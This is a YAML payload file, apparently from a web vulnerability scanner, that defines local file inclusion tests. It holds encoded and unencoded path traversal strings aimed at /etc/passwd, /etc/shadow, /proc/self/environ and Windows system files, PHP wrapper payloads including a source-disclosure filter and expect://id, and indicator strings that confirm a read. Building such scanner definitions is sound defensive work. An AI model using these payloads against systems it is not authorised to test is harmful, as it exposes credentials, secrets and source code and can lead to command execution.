name: "Local File Inclusion (LFI)"
category: "lfi"
severity: "high"
payloads:
  - value: "../../../etc/passwd"
    detection: "error_based"
  - value: "../../../../etc/passwd"
    detection: "error_based"
  - value: "../../../../../etc/passwd"
    detection: "error_based"
  - value: "../../../../../../etc/passwd"
    detection: "error_based"
  - value: "../../../etc/shadow"
    detection: "error_based"
  - value: "../../../etc/hosts"
    detection: "error_based"
  - value: "../../../proc/self/environ"
    detection: "error_based"
  - value: "../../../proc/version"
    detection: "error_based"
  - value: "..\\..\\..\\windows\\win.ini"
    detection: "error_based"
  - value: "..\\..\\..\\..\\windows\\win.ini"
    detection: "error_based"
  - value: "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
    detection: "error_based"
  - value: "....//....//....//etc/passwd"
    detection: "error_based"
  - value: "..%2f..%2f..%2fetc%2fpasswd"
    detection: "error_based"
  - value: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    detection: "error_based"
  - value: "..%252f..%252f..%252fetc%252fpasswd"
    detection: "error_based"
  - value: "/etc/passwd%00"
    detection: "error_based"
  - value: "php://filter/convert.base64-encode/resource=/etc/passwd"
    detection: "error_based"
  - value: "php://filter/convert.base64-encode/resource=index.php"
    detection: "error_based"
  - value: "php://input"
    detection: "error_based"
  - value: "expect://id"
    detection: "error_based"

indicators:
  - "root:x:0"
  - "root:*:0"
  - "bin/bash"
  - "bin/sh"
  - "daemon:x:"
  - "mail:x:"
  - "nobody:x:"
  - "for 16-bit app support"
  - "[extensions]"
  - "[fonts]"
  - "127.0.0.1"
  - "localhost"
  - "LINUX"
  - "proc/version"
  - "HOME="
  - "PATH="
  - "SHELL="
